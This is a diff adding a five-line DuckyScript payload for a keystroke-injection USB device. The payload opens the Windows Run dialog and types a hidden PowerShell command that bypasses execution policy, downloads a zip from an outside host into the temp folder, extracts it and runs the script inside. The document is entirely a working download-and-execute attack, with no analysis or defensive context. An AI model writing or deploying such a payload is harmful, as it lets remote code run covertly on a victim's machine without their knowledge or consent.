@@ -1,0 +1,5 @@
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Ep Bypass -Command "$D='$env:temp'; irm -Uri 'https://jakoby.lol/qee' -OutFile \"$D\\rr.zip\"; Expand-Archive -Path \"$D\\rr.zip\" -DestinationPath \"$D\\rr\" -Force; & \"$D\\rr\\rr.ps1\""
+ENTER
